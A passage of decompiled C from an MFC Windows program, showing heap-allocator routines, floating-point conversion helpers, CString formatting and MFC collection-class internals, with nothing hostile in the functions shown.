    v2 += 1024;
  }
  return v0;
}
// 428188: using guessed type void *off_428188;
// 428198: using guessed type int dword_428198;

//----- (0041260E) --------------------------------------------------------
void **__cdecl sub_41260E(void **lpMem)
{
  void **result; // eax

  result = (void **)VirtualFree(lpMem[4], 0, 0x8000u);
  if ( off_42A1A8 == lpMem )
  {
    result = (void **)lpMem[1];
    off_42A1A8 = result;
  }
  if ( lpMem == &off_428188 )
  {
    dword_428198 = -1;
  }
  else
  {
    *(_DWORD *)lpMem[1] = *lpMem;
    *((_DWORD *)*lpMem + 1) = lpMem[1];
    return (void **)HeapFree(dword_446D68, 0, lpMem);
  }
  return result;
}
// 428188: using guessed type void *off_428188;
// 428198: using guessed type int dword_428198;
// 42A1A8: using guessed type void **off_42A1A8;

//----- (00412664) --------------------------------------------------------
void __cdecl sub_412664(int a1)
{
  _DWORD *v1; // esi
  _DWORD *v2; // edi
  int i; // ebx
  unsigned int v4; // eax
  _DWORD *v5; // ecx
  _DWORD *v6; // eax
  int j; // edx
  int v8; // [esp+Ch] [ebp-4h]

  v1 = off_42818C;
  do
  {
    if ( v1[4] != -1 )
    {
      v8 = 0;
      v2 = v1 + 2052;
      for ( i = 4190208; i >= 0; i -= 4096 )
      {
        if ( *v2 == 240 && VirtualFree((LPVOID)(v1[4] + i), 0x1000u, 0x4000u) )
        {
          *v2 = -1;
          --dword_445A24;
          v4 = v1[3];
          if ( !v4 || v4 > (unsigned int)v2 )
            v1[3] = v2;
          ++v8;
          if ( !--a1 )
            break;
        }
        v2 -= 2;
      }
      v5 = v1;
      v1 = (_DWORD *)v1[1];
      if ( v8 && v5[6] == -1 )
      {
        v6 = v5 + 8;
        for ( j = 1; j < 1024; ++j )
        {
          if ( *v6 != -1 )
            break;
          v6 += 2;
        }
        if ( j == 1024 )
          sub_41260E((void **)v5);
      }
    }
  }
  while ( v1 != off_42818C && a1 > 0 );
}
// 445A24: using guessed type int dword_445A24;

//----- (00412726) --------------------------------------------------------
unsigned int __cdecl sub_412726(unsigned int a1, void ***a2, unsigned int *a3)
{
  void **v3; // ecx

  v3 = &off_428188;
  while ( a1 <= (unsigned int)v3[4] || a1 >= (unsigned int)v3[5] )
  {
    v3 = (void **)*v3;
    if ( v3 == &off_428188 )
      return 0;
  }
  if ( (a1 & 0xF) == 0 && (a1 & 0xFFF) >= 0x100 )
  {
    *a2 = v3;
    *a3 = a1 & 0xFFFFF000;
    return ((int)(a1 - (a1 & 0xFFFFF000) - 256) >> 4) + (a1 & 0xFFFFF000) + 8;
  }
  return 0;
}
// 428188: using guessed type void *off_428188;

//----- (0041277D) --------------------------------------------------------
void __cdecl sub_41277D(int a1, int a2, _BYTE *a3)
{
  _DWORD *v3; // eax
  bool v4; // zf

  v3 = (_DWORD *)(a1 + 8 * ((a2 - *(_DWORD *)(a1 + 16)) >> 12) + 24);
  *v3 += (unsigned __int8)*a3;
  *a3 = 0;
  v4 = *v3 == 240;
  v3[1] = 241;
  if ( v4 && ++dword_445A24 == 32 )
    sub_412664(16);
}
// 445A24: using guessed type int dword_445A24;

//----- (004127C2) --------------------------------------------------------
int __cdecl sub_4127C2(unsigned int a1)
{
  void **v1; // esi
  void *v2; // edx
  unsigned int *v3; // edi
  int v4; // eax
  unsigned int v5; // ebx
  int result; // eax
  void **v7; // edi
  _DWORD *v8; // ebx
  _DWORD *v9; // eax
  _DWORD *i; // esi
  void **v11; // ecx
  _DWORD *v12; // eax
  void **v13; // eax
  bool v14; // cf
  void **v15; // eax
  _BYTE *v16; // ecx
  unsigned int Val; // [esp+Ch] [ebp-8h]
  int v18; // [esp+10h] [ebp-4h]
  int v19; // [esp+10h] [ebp-4h]
  int v20; // [esp+10h] [ebp-4h]

  v1 = off_42A1A8;
  do
  {
    v2 = v1[4];
    if ( v2 == (void *)-1 )
    {
      v5 = a1;
    }
    else
    {
      v3 = (unsigned int *)v1[2];
      v4 = (int)v2 + 4096 * (((char *)v3 - (char *)v1 - 24) >> 3);
      v18 = v4;
      if ( v3 < (unsigned int *)v1 + 2054 )
      {
        while ( 1 )
        {
          v5 = a1;
          if ( (int)*v3 >= (int)a1 && v3[1] > a1 )
          {
            result = sub_4129CA(v4, *v3, a1);
            if ( result )
            {
LABEL_21:
              off_42A1A8 = v1;
              *v3 -= v5;
              v1[2] = v3;
              return result;
            }
            v4 = v18;
            v3[1] = a1;
          }
          v3 += 2;
          v4 += 4096;
          v18 = v4;
          if ( v3 >= (unsigned int *)v1 + 2054 )
            goto LABEL_11;
        }
      }
      v5 = a1;
LABEL_11:
      v3 = (unsigned int *)(v1 + 6);
      Val = (unsigned int)v1[2];
      v19 = (int)v1[4];
      if ( (unsigned int)(v1 + 6) < Val )
      {
        do
        {
          if ( (int)*v3 >= (int)v5 && v3[1] > v5 )
          {
            result = sub_4129CA(v19, *v3, v5);
            if ( result )
              goto LABEL_21;
            v3[1] = v5;
          }
          v19 += 4096;
          v3 += 2;
        }
        while ( (unsigned int)v3 < Val );
      }
    }
    v1 = (void **)*v1;
  }
  while ( v1 != off_42A1A8 );
  v7 = &off_428188;
  while ( v7[4] == (void *)-1 || !v7[3] )
  {
    v7 = (void **)*v7;
    if ( v7 == &off_428188 )
    {
      v15 = sub_4124CA();
      if ( v15 )
      {
        v16 = v15[4];
        v16[8] = v5;
        off_42A1A8 = v15;
        *(_DWORD *)v16 = &v16[v5 + 8];
        *((_DWORD *)v16 + 1) = 240 - v5;
        v15[6] = (char *)v15[6] - (unsigned __int8)v5;
        return (int)(v16 + 256);
      }
      return 0;
    }
  }
  v8 = v7[3];
  v20 = 0;
  v9 = v8;
  for ( i = (char *)v7[4] + 4096 * (((char *)v8 - (char *)v7 - 24) >> 3); *v9 == -1; ++v20 )
  {
    if ( v20 >= 16 )
      break;
    v9 += 2;
  }
  if ( VirtualAlloc(i, v20 << 12, 0x1000u, 4u) != i )
    return 0;
  v11 = (void **)v8;
  if ( v20 > 0 )
  {
    v12 = i + 1;
    do
    {
      *((_BYTE *)v12 + 244) = -1;
      *(v12 - 1) = v12 + 1;
      *v12 = 240;
      *v11 = (void *)240;
      v11[1] = (void *)241;
      v12 += 1024;
      v11 += 2;
      --v20;
    }
    while ( v20 );
  }
  off_42A1A8 = v7;
  v13 = v7 + 2054;
  while ( 1 )
  {
    v14 = v11 < v13;
    if ( v11 >= v13 )
      break;
    if ( *v11 == (void *)-1 )
    {
      v14 = v11 < v13;
      break;
    }
    v11 += 2;
  }
  v7[3] = v14 ? v11 : 0;
  *((_BYTE *)i + 8) = a1;
  v7[2] = v8;
  *v8 -= a1;
  i[1] -= a1;
  result = (int)(i + 64);
  *i = (char *)i + a1 + 8;
  return result;
}
// 428188: using guessed type void *off_428188;
// 42A1A8: using guessed type void **off_42A1A8;

//----- (004129CA) --------------------------------------------------------
int __cdecl sub_4129CA(int a1, unsigned int a2, unsigned int a3)
{
  unsigned int v4; // esi
  _BYTE *v5; // edi
  unsigned int v6; // ebx
  _BYTE *v7; // eax
  _BYTE *v8; // eax
  _BYTE *v9; // esi
  _BYTE *v10; // ebx
  unsigned int v11; // esi
  _BYTE *v12; // esi
  _BYTE *v13; // ebx
  unsigned int v14; // eax
  _BYTE *v16; // [esp+Ch] [ebp-4h]
  unsigned int v17; // [esp+18h] [ebp+8h]

  v4 = *(_DWORD *)(a1 + 4);
  v5 = *(_BYTE **)a1;
  v6 = a1 + 248;
  v16 = *(_BYTE **)a1;
  v7 = *(_BYTE **)a1;
  v17 = a1 + 248;
  if ( v4 >= a3 )
  {
    *v5 = a3;
    if ( (unsigned int)&v5[a3] >= v6 )
    {
      *(_DWORD *)(a1 + 4) = 0;
      *(_DWORD *)a1 = a1 + 8;
    }
    else
    {
      *(_DWORD *)a1 += a3;
      *(_DWORD *)(a1 + 4) -= a3;
    }
    v8 = v5 + 8;
    return 16 * (_DWORD)v8 - 15 * a1;
  }
  v9 = &v5[v4];
  if ( *v9 )
    v7 = v9;
  if ( (unsigned int)&v7[a3] >= v6 )
  {
LABEL_20:
    v12 = (_BYTE *)(a1 + 8);
    while ( v12 < v5 && (unsigned int)&v12[a3] < v17 )
    {
      if ( *v12 )
      {
        v12 += (unsigned __int8)*v12;
      }
      else
      {
        v13 = v12 + 1;
        v14 = 1;
        while ( !*v13 )
        {
          ++v13;
          ++v14;
        }
        if ( v14 >= a3 )
        {
          if ( (unsigned int)&v12[a3] >= v17 )
          {
            *(_DWORD *)(a1 + 4) = 0;
            *(_DWORD *)a1 = a1 + 8;
          }
          else
          {
            *(_DWORD *)a1 = &v12[a3];
            *(_DWORD *)(a1 + 4) = v14 - a3;
          }
          *v12 = a3;
          v8 = v12 + 8;
          return 16 * (_DWORD)v8 - 15 * a1;
        }
        a2 -= v14;
        if ( a2 < a3 )
          return 0;
        v12 = v13;
      }
    }
    return 0;
  }
  while ( *v7 )
  {
    v7 += (unsigned __int8)*v7;
LABEL_19:
    if ( (unsigned int)&v7[a3] >= v17 )
      goto LABEL_20;
  }
  v10 = v7 + 1;
  v11 = 1;
  while ( !*v10 )
  {
    ++v10;
    ++v11;
  }
  if ( v11 < a3 )
  {
    if ( v7 == v16 )
    {
      *(_DWORD *)(a1 + 4) = v11;
    }
    else
    {
      a2 -= v11;
      if ( a2 < a3 )
        return 0;
    }
    v5 = v16;
    v7 = v10;
    goto LABEL_19;
  }
  if ( (unsigned int)&v7[a3] >= v17 )
  {
    *(_DWORD *)(a1 + 4) = 0;
    *(_DWORD *)a1 = a1 + 8;
  }
  else
  {
    *(_DWORD *)a1 = &v7[a3];
    *(_DWORD *)(a1 + 4) = v11 - a3;
  }
  *v7 = a3;
  v8 = v7 + 8;
  return 16 * (_DWORD)v8 - 15 * a1;
}

//----- (00412AEE) --------------------------------------------------------
int __cdecl sub_412AEE(int a1, _DWORD *a2, _BYTE *a3, unsigned int a4)
{
  unsigned int v4; // ecx
  _DWORD *v5; // edi
  _BYTE *v6; // esi
  _BYTE *i; // eax
  bool v8; // zf
  int v9; // eax
  int v11; // [esp+Ch] [ebp-4h]

  v4 = (unsigned __int8)*a3;
  v11 = 0;
  v5 = (_DWORD *)(a1 + 8 * (((int)a2 - *(_DWORD *)(a1 + 16)) >> 12) + 24);
  if ( v4 > a4 )
  {
    *a3 = a4;
    *v5 += v4 - a4;
    v5[1] = 241;
    return 1;
  }
  if ( v4 < a4 )
  {
    v6 = &a3[a4];
    if ( &a3[a4] <= (_BYTE *)a2 + 248 )
    {
      for ( i = &a3[v4]; ; ++i )
      {
        v8 = i == v6;
        if ( i >= v6 )
          break;
        if ( *i )
        {
          v8 = i == v6;
          break;
        }
      }
      if ( v8 )
      {
        *a3 = a4;
        if ( (unsigned int)a3 <= *a2 && (unsigned int)v6 > *a2 )
        {
          if ( v6 >= (_BYTE *)a2 + 248 )
          {
            a2[1] = 0;
            *a2 = a2 + 2;
          }
          else
          {
            v9 = 0;
            *a2 = v6;
            if ( !*v6 )
            {
              do
                ++v9;
              while ( !v6[v9] );
            }
            a2[1] = v9;
          }
        }
        *v5 += v4 - a4;
        return 1;
      }
    }
  }
  return v11;
}

//----- (00413176) --------------------------------------------------------
LONG (__stdcall *sub_413176())(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  LONG (__stdcall *result)(struct _EXCEPTION_POINTERS *); // eax

  result = SetUnhandledExceptionFilter(__CxxUnhandledExceptionFilter);
  lpfn = result;
  return result;
}

//----- (00413187) --------------------------------------------------------
LPTOP_LEVEL_EXCEPTION_FILTER sub_413187()
{
  return SetUnhandledExceptionFilter(lpfn);
}

//----- (004147FC) --------------------------------------------------------
int __cdecl sub_4147FC(int a1, int a2)
{
  return _ld12cvt(a1, a2, &unk_42A958);
}
// 414690: using guessed type _DWORD __cdecl _ld12cvt(_DWORD, _DWORD, _DWORD);

//----- (00414812) --------------------------------------------------------
int __cdecl sub_414812(int a1, int a2)
{
  return _ld12cvt(a1, a2, &unk_42A970);
}
// 414690: using guessed type _DWORD __cdecl _ld12cvt(_DWORD, _DWORD, _DWORD);

//----- (00414828) --------------------------------------------------------
int __cdecl sub_414828(int a1, int a2)
{
  char v3[12]; // [esp+0h] [ebp-Ch] BYREF

  __strgtold12(v3, &a2, a2, 0, 0, 0, 0);
  return sub_4147FC((int)v3, a1);
}
// 414EFC: using guessed type _DWORD __cdecl __strgtold12(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00414855) --------------------------------------------------------
int __cdecl sub_414855(int a1, int a2)
{
  char v3[12]; // [esp+0h] [ebp-Ch] BYREF

  __strgtold12(v3, &a2, a2, 0, 0, 0, 0);
  return sub_414812((int)v3, a1);
}
// 414EFC: using guessed type _DWORD __cdecl __strgtold12(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00414A14) --------------------------------------------------------
int sub_414A14()
{
  return 0;
}

//----- (004160A2) --------------------------------------------------------
int sub_4160A2()
{
  nullsub_9();
  return atexit(sub_4160B9);
}
// 4160AC: using guessed type int nullsub_9(void);

//----- (004160B9) --------------------------------------------------------
void __cdecl sub_4160B9()
{
  std::locale::~locale((std::locale *)&unk_445C84);
}

//----- (004160ED) --------------------------------------------------------
int sub_4160ED()
{
  return atexit(nullsub_3);
}

//----- (00416130) --------------------------------------------------------
int sub_416130()
{
  return atexit(nullsub_3);
}

//----- (00416172) --------------------------------------------------------
int sub_416172()
{
  return atexit(nullsub_3);
}

//----- (0041624A) --------------------------------------------------------
void __cdecl sub_41624A()
{
  AfxTermLocalData(0, 1);
  sub_41D708();
  AfxTlsRelease();
}

//----- (00416262) --------------------------------------------------------
int sub_416262()
{
  int result; // eax

  AfxInitialize(0, 0x600u);
  result = atexit(sub_41624A);
  byte_445D24 = result;
  return result;
}
// 445D24: using guessed type char byte_445D24;

//----- (00416280) --------------------------------------------------------
CString *__thiscall sub_416280(LPCSTR *this, CString *a2, void *Size)
{
  signed int v3; // eax

  v3 = (signed int)Size;
  if ( (int)Size < 0 )
    v3 = 0;
  if ( v3 < *((_DWORD *)*this - 2) )
  {
    Size = off_4276D4;
    sub_417CDC(this, &Size, v3, 0, 0);
    sub_417A27(a2, (LPCSTR *)&Size);
    sub_417CB2(&Size);
  }
  else
  {
    sub_417A27(a2, this);
  }
  return a2;
}
// 4276D4: using guessed type void *off_4276D4;

//----- (004162F8) --------------------------------------------------------
CString *__thiscall sub_4162F8(const unsigned __int8 **this, CString *a2, unsigned __int8 *Control)
{
  void *v4; // eax

  v4 = (void *)_mbscspn(*this, Control);
  sub_416280((LPCSTR *)this, a2, v4);
  return a2;
}

//----- (00416323) --------------------------------------------------------
void __thiscall sub_416323(CString *this, char *Format, va_list a3)
{
  unsigned __int8 *v3; // edi
  unsigned __int8 v4; // al
  int v5; // esi
  int v6; // ebx
  unsigned __int8 *v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  int v19; // eax
  int v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // eax
  int v24; // eax
  int v25; // eax
  int v26; // eax
  void *v27; // esp
  size_t v28; // eax
  int v29; // eax
  int v30; // eax
  int v31; // eax
  int v32; // eax
  size_t v33; // eax
  CString *v34; // esi
  char v35[12]; // [esp+8h] [ebp-20h] BYREF
  va_list ArgList; // [esp+14h] [ebp-14h]
  CString *v37; // [esp+18h] [ebp-10h]
  int v38; // [esp+1Ch] [ebp-Ch]
  int v39; // [esp+20h] [ebp-8h]
  int v40; // [esp+24h] [ebp-4h]

  v39 = 0;
  v3 = (unsigned __int8 *)Format;
  v37 = this;
  ArgList = a3;
  while ( *v3 )
  {
    if ( *v3 != 37 || (v3 = _mbsinc(v3), v4 = *v3, *v3 == 37) )
    {
      v33 = _mbclen(v3);
      v39 += v33;
      goto LABEL_92;
    }
    v5 = 0;
    v40 = 0;
    if ( !v4 )
    {
LABEL_16:
      v40 = atoi((const char *)v3);
      while ( *v3 && _ismbcdigit((char)*v3) )
        v3 = _mbsinc(v3);
      goto LABEL_20;
    }
    while ( v4 == 35 )
    {
      v39 += 2;
LABEL_14:
      v3 = _mbsinc(v3);
      v4 = *v3;
      if ( !*v3 )
        goto LABEL_15;
    }
    if ( v4 == 42 )
    {
      a3 += 4;
      v40 = *((_DWORD *)a3 - 1);
      goto LABEL_14;
    }
    if ( v4 == 45 || v4 == 43 || v4 == 48 || v4 == 32 )
      goto LABEL_14;
LABEL_15:
    if ( !v40 )
      goto LABEL_16;
LABEL_20:
    v6 = 0;
    if ( *v3 == 46 )
    {
      v7 = _mbsinc(v3);
      v3 = v7;
      if ( *v7 == 42 )
      {
        a3 += 4;
        v6 = *((_DWORD *)a3 - 1);
        v3 = _mbsinc(v7);
      }
      else
      {
        v6 = atoi((const char *)v7);
        while ( *v3 && _ismbcdigit((char)*v3) )
          v3 = _mbsinc(v3);
      }
    }
    v38 = 0;
    if ( !_mbsnbcmp(v3, "I64", 3u) )
    {
      v3 += 3;
      v38 = 0x40000;
      goto LABEL_37;
    }
    switch ( *v3 )
    {
      case 'F':
      case 'L':
      case 'N':
        goto LABEL_36;
      case 'h':
        v38 = 0x10000;
LABEL_36:
        v3 = _mbsinc(v3);
        break;
      case 'l':
        v38 = 0x20000;
        goto LABEL_36;
    }
LABEL_37:
    v8 = v38 | (char)*v3;
    if ( v8 > 65635 )
    {
      v20 = v8 - 65651;
      if ( !v20 )
        goto LABEL_62;
      v21 = v20 - 65488;
      if ( !v21 )
        goto LABEL_61;
      v22 = v21 - 16;
      if ( !v22 )
      {
LABEL_59:
        a3 += 4;
        if ( !*((_DWORD *)a3 - 1) )
          goto LABEL_63;
        v24 = wcslen(*((const wchar_t **)a3 - 1));
        goto LABEL_65;
      }
      v23 = v22 - 16;
      if ( !v23 )
      {
LABEL_61:
        a3 += 4;
        v5 = 2;
        goto LABEL_68;
      }
      if ( v23 == 16 )
        goto LABEL_59;
LABEL_45:
      v14 = (char)*v3;
      if ( v14 > 105 )
      {
        v29 = v14 - 110;
        if ( !v29 )
        {
          a3 += 4;
          goto LABEL_90;
        }
        v30 = v29 - 1;
        if ( !v30 )
          goto LABEL_87;
        v31 = v30 - 1;
        if ( v31 )
        {
          v32 = v31 - 5;
          if ( v32 && v32 != 3 )
            goto LABEL_90;
          goto LABEL_87;
        }
      }
      else
      {
        if ( v14 != 105 )
        {
          v15 = v14 - 71;
          if ( !v15 )
            goto LABEL_76;
          v16 = v15 - 17;
          if ( v16 )
          {
            v17 = v16 - 12;
            if ( v17 )
            {
              v18 = v17 - 1;
              if ( !v18 )
                goto LABEL_76;
              v19 = v18 - 1;
              if ( v19 )
              {
                if ( v19 != 1 )
                  goto LABEL_90;
LABEL_76:
                a3 += 8;
                v5 = 128;
LABEL_85:
                v28 = v6 + v40;
                if ( v6 + v40 < v5 )
                  goto LABEL_90;
              }
              else
              {
                v25 = v6 + 318;
                if ( v40 > v6 + 318 )
                  v25 = v40;
                v26 = v25 + 3;
                LOBYTE(v26) = v26 & 0xFC;
                v27 = alloca(v26);
                a3 += 8;
                sprintf(v35, "%*.*f", v40, v6 + 6, *((double *)a3 - 1));
                v28 = strlen(v35);
              }
              v5 = v28;
              goto LABEL_90;
            }
          }
        }
LABEL_87:
        if ( (v38 & 0x40000) != 0 )
        {
          a3 += 8;
          goto LABEL_84;
        }
      }
      a3 += 4;
LABEL_84:
      v5 = 32;
      goto LABEL_85;
    }
    if ( v8 == 65635 )
      goto LABEL_61;
    v9 = v8 - 67;
    if ( !v9 )
      goto LABEL_61;
    v10 = v9 - 16;
    if ( !v10 )
      goto LABEL_59;
    v11 = v10 - 16;
    if ( !v11 )
      goto LABEL_61;
    v12 = v11 - 16;
    if ( !v12 )
      goto LABEL_62;
    v13 = v12 - 65488;
    if ( !v13 )
      goto LABEL_61;
    if ( v13 != 16 )
      goto LABEL_45;
LABEL_62:
    a3 += 4;
    if ( !*((_DWORD *)a3 - 1) )
    {
LABEL_63:
      v5 = 6;
      goto LABEL_68;
    }
    v24 = lstrlenA(*((LPCSTR *)a3 - 1));
LABEL_65:
    v5 = v24;
    if ( v24 < 1 )
      v5 = 1;
    if ( !v5 )
      goto LABEL_45;
LABEL_68:
    if ( v6 && v5 >= v6 )
      v5 = v6;
    if ( v5 <= v40 )
      v5 = v40;
LABEL_90:
    v39 += v5;
LABEL_92:
    v3 = _mbsinc(v3);
  }
  v34 = v37;
  sub_417F33(v37, v39);
  vsprintf(*(char *const *)v34, Format, ArgList);
  CString::ReleaseBuffer(v34, -1);
}

//----- (00416670) --------------------------------------------------------
void __cdecl sub_416670(CString *a1, char *Format, int a3)
{
  sub_416323(a1, Format, (va_list)&a3);
}

//----- (004166EF) --------------------------------------------------------
void __stdcall __noreturn sub_4166EF(int a1)
{
  void *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = &unk_443B70;
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI5PAVCMemoryException__);
}

//----- (0041676C) --------------------------------------------------------
_DWORD *__thiscall sub_41676C(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  *this = &CStringArray::`vftable';
  this[1] = 0;
  this[4] = 0;
  this[3] = 0;
  this[2] = 0;
  return result;
}
// 4207CC: using guessed type void *CStringArray::`vftable';

//----- (00416783) --------------------------------------------------------
CStringArray *__thiscall sub_416783(CStringArray *lpMem, char a2)
{
  CStringArray::~CStringArray(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (00416948) --------------------------------------------------------
int __thiscall sub_416948(CStringArray *this, int a2, LPCSTR lpString)
{
  if ( a2 >= *((_DWORD *)this + 2) )
    CStringArray::SetSize(this, a2 + 1, -1);
  return CString::operator=((CString *)(*((_DWORD *)this + 1) + 4 * a2), lpString);
}

//----- (004169DD) --------------------------------------------------------
_DWORD *__thiscall sub_4169DD(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  result = this;
  this[3] = 0;
  this[4] = 0;
  this[2] = 0;
  this[1] = 0;
  this[5] = 0;
  *this = &CPtrList::`vftable';
  this[6] = a2;
  return result;
}
// 420F90: using guessed type void *CPtrList::`vftable';

//----- (00416A00) --------------------------------------------------------
_DWORD *__thiscall sub_416A00(_DWORD *lpMem, char a2)
{
  sub_416A3C(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (00416A3C) --------------------------------------------------------
int __thiscall sub_416A3C(_DWORD *this)
{
  *this = &CPtrList::`vftable';
  return sub_416A1C(this);
}
// 416A1C: using guessed type int __cdecl sub_416A1C(_DWORD);
// 420F90: using guessed type void *CPtrList::`vftable';

//----- (00416A65) --------------------------------------------------------
#error "416A76: call analysis failed (funcsize=8)"

//----- (00416A7E) --------------------------------------------------------
int __thiscall sub_416A7E(_DWORD *this)
{
  int *v1; // eax
  int v2; // edx
  int v3; // esi
  bool v4; // zf

  v1 = (int *)this[1];
  v2 = *v1;
  v3 = v1[2];
  v4 = *v1 == 0;
  this[1] = *v1;
  if ( v4 )
    this[2] = 0;
  else
    *(_DWORD *)(v2 + 4) = 0;
  sub_416A65(v1);
  return v3;
}
// 416A65: using guessed type _DWORD __stdcall sub_416A65(_DWORD);

//----- (00416AD8) --------------------------------------------------------
_DWORD *__thiscall sub_416AD8(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  result = this;
  this[1] = 0;
  this[3] = 0;
  this[4] = 0;
  this[5] = 0;
  *this = &CMapPtrToPtr::`vftable';
  this[2] = 17;
  this[6] = a2;
  return result;
}
// 420F5C: using guessed type void *CMapPtrToPtr::`vftable';

//----- (00416AFF) --------------------------------------------------------
_DWORD *__thiscall sub_416AFF(_DWORD *lpMem, char a2)
{
  sub_416B8B(lpMem);
  if ( (a2 & 1) != 0 )
    sub_417A1C(lpMem);
  return lpMem;
}

//----- (00416B1B) --------------------------------------------------------
void __thiscall sub_416B1B(int this, int a2, int a3)
{
  void *v4; // eax

  if ( *(_DWORD *)(this + 4) )
  {
    sub_417A1C(*(LPVOID *)(this + 4));
    *(_DWORD *)(this + 4) = 0;
  }
  if ( a3 )
  {
    v4 = sub_4179F3(4 * a2);
    *(_DWORD *)(this + 4) = v4;
    memset(v4, 0, 4 * a2);
  }
  *(_DWORD *)(this + 8) = a2;
}

//----- (00416B8B) --------------------------------------------------------
int __thiscall sub_416B8B(_DWORD *this)
{
  *this = &CMapPtrToPtr::`vftable';
  return sub_416B60(this);
}
// 416B60: using guessed type int __cdecl sub_416B60(_DWORD);
// 420F5C: using guessed type void *CMapPtrToPtr::`vftable';

//----- (00416BB4) --------------------------------------------------------
int *__thiscall sub_416BB4(int this)
{
  struct CPlex *v2; // eax
  int v3; // ecx
  int v4; // edx
  int v5; // ecx
  _DWORD *v6; // eax
  int v7; // ecx
  int *result; // eax
  int v9; // ecx

  if ( !*(_DWORD *)(this + 16) )
  {
    v2 = CPlex::Create((struct CPlex **)(this + 20), *(_DWORD *)(this + 24), 0xCu);
    v3 = *(_DWORD *)(this + 24);
    v4 = 3 * v3;
    v5 = v3 - 1;
    v6 = (_DWORD *)((char *)v2 + 4 * v4 - 8);
    if ( v5 >= 0 )
    {
      v7 = v5 + 1;
      do
      {
        *v6 = *(_DWORD *)(this + 16);
        *(_DWORD *)(this + 16) = v6;
        v6 -= 3;
        --v7;
      }
      while ( v7 );
    }
  }
  result = *(int **)(this + 16);
  v9 = *result;
  ++*(_DWORD *)(this + 12);
  *(_DWORD *)(this + 16) = v9;
  result[1] = 0;
  result[2] = 0;
  return result;
}

//----- (00416C01) --------------------------------------------------------
#error "416C12: call analysis failed (funcsize=8)"

//----- (00416C7F) --------------------------------------------------------
int *__thiscall sub_416C7F(_DWORD *this, int a2)
{
  int v2; // edi
  int *v4; // eax

  v2 = a2;
  v4 = (int *)sub_416C1A(a2, &a2);
  if ( !v4 )
  {
    if ( !this[1] )
      sub_416B1B((int)this, this[2], 1);
    v4 = sub_416BB4((int)this);
    v4[1] = v2;
    *v4 = *(_DWORD *)(this[1] + 4 * a2);
    *(_DWORD *)(this[1] + 4 * a2) = v4;
  }
  return v4 + 2;
}
// 416C1A: using guessed type _DWORD __stdcall sub_416C1A(_DWORD, _DWORD);

//----- (00416CCF) --------------------------------------------------------
int __thiscall sub_416CCF(_DWORD *this, unsigned int a2)
{
  int v2; // esi
  int v3; // edx
  _DWORD *v4; // eax
  _DWORD *v5; // edx

  v2 = this[1];
  if ( v2 )
  {
    v3 = (a2 >> 4) % this[2];
    v4 = *(_DWORD **)(v2 + 4 * v3);
    v5 = (_DWORD *)(v2 + 4 * v3);
    while ( v4 )
    {
      if ( v4[1] == a2 )
      {
        *v5 = *v4;
        sub_416C01(v4);
        return 1;
      }
      v5 = v4;
      v4 = (_DWORD *)*v4;
    }
  }
  return 0;
}
// 416C01: using guessed type _DWORD __stdcall sub_416C01(_DWORD);

//----- (00416D11) --------------------------------------------------------
int __thiscall sub_416D11(_DWORD *this, _DWORD **a2, _DWORD *a3, _DWORD *a4)
{
  _DWORD *v4; // esi
  unsigned int v5; // edx
  unsigned int v6; // edi
  _DWORD **v7; // eax
  _DWORD *v8; // edi
  unsigned int v9; // ebx
  unsigned int v10; // edx
  _DWORD *v11; // eax
  int result; // eax

  v4 = *a2;
  if ( *a2 == (_DWORD *)-1 )
  {
    v5 = this[2];
    v6 = 0;
    if ( v5 )
    {
      v7 = (_DWORD **)this[1];
      do
      {
        v4 = *v7;
        if ( *v7 )
          break;
        ++v6;
        ++v7;
      }
      while ( v6 < v5 );
    }
  }
  v8 = (_DWORD *)*v4;
  if ( !*v4 )
  {
    v9 = this[2];
    v10 = (v4[1] >> 4) % v9 + 1;
    if ( v10 < v9 )
    {
      v11 = (_DWORD *)(this[1] + 4 * v10);
      do
      {
        v8 = (_DWORD *)*v11;
        if ( *v11 )
          break;
        ++v10;
        ++v11;
      }
      while ( v10 < v9 );
    }
  }
  *a2 = v8;
  *a3 = v4[1];
  result = v4[2];
  *a4 = result;
  return result;
}

//----- (00416D83) --------------------------------------------------------
void **sub_416D83()
{
  return &off_420258;
}
// 420258: using guessed type void *off_420258;

//----- (00416DAB) --------------------------------------------------------
int __thiscall sub_416DAB(_DWORD *this, int a2, int a3)
{
  HWND *v4; // esi

  v4 = (HWND *)sub_40A780();
  this[33] = 0;
  PostMessageA(v4[7], 0x36Au, 0, 0);
  return (*((int (__thiscall **)(HWND *, int, int))*v4 + 27))(v4, a2, a3);
}

//----- (00416DE2) --------------------------------------------------------
int __stdcall sub_416DE2(CObject *a1, int a2)
{
  int v2; // ebx
  int v3; // edi

  if ( *(_DWORD *)(a2 + 4) == 1 || *(_DWORD *)(a2 + 4) == 15 )
    return unknown_libname_19(a1, a2);
  v2 = 0;
  v3 = 61704;
  if ( *(_DWORD *)(a2 + 4) == 273 )
  {
    if ( !*(_DWORD *)(a2 + 12) )
      v3 = 61705;
    v2 = 1;
  }
  if ( CObject::IsKindOf(a1, (const struct CRuntimeClass *)&off_420850) )
  {
    (*(void (__thiscall **)(CObject *, int, int))(*(_DWORD *)a1 + 16))(a1, 4144, v3);
  }
  else if ( !CObject::IsKindOf(a1, (const struct CRuntimeClass *)&off_4205D8) )
  {
    (*(void (__thiscall **)(CObject *, int, int))(*(_DWORD *)a1 + 16))(a1, 16, v3);
  }
  return v2;
}
// 4172B5: using guessed type _DWORD __stdcall unknown_libname_19(_DWORD, _DWORD);
// 4205D8: using guessed type char *off_4205D8;
// 420850: using guessed type char *off_420850;

//----- (00416E59) --------------------------------------------------------
BOOL __thiscall sub_416E59(CWinThread *this, int a2)
{
  int v2; // edi
  int v4; // ecx
  int v5; // eax

  v2 = a2;
  if ( a2 > 0 )
  {
